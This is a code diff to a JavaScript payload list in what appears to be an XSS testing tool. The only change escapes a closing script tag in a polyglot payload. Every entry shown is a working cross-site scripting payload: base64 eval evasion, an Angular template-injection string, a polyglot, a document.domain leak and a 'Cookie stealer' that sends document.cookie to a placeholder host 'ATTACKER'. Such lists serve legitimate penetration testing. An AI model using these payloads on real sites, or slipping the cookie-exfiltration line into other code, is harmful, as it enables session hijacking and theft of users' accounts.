@@ -337,7 +337,7 @@ const PAYLOADS = {
     {id:"xss10",name:"Eval atob bypass",payload:"<script>eval(atob('YWxlcnQoMSk='))<\/script>",tags:["evasion","base64"],source:"PATT"},
     {id:"xss11",name:"Template string",payload:"<script>alert`1`<\/script>",tags:["template","bypass"],source:"PATT"},
     {id:"xss12",name:"Angular SSTI XSS",payload:"{{constructor.constructor('alert(1)')()}}",tags:["angular","ssti"],source:"PATT"},
-    {id:"xss13",name:"Polyglot",payload:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",tags:["polyglot","advanced"],source:"PATT"},
+    {id:"xss13",name:"Polyglot",payload:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/<\\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",tags:["polyglot","advanced"],source:"PATT"},
     {id:"xss14",name:"DOM document.domain",payload:"<img src=1 onerror=alert(document.domain)>",tags:["dom","info-leak"],source:"PATT"},
     {id:"xss15",name:"Cookie stealer",payload:"<script>document.location='http://ATTACKER/?c='+document.cookie<\/script>",tags:["cookie","exfil"],source:"PF"},
     {id:"xss16",name:"Object data JS",payload:'<object data="javascript:alert(1)">',tags:["object","bypass"],source:"PATT"},
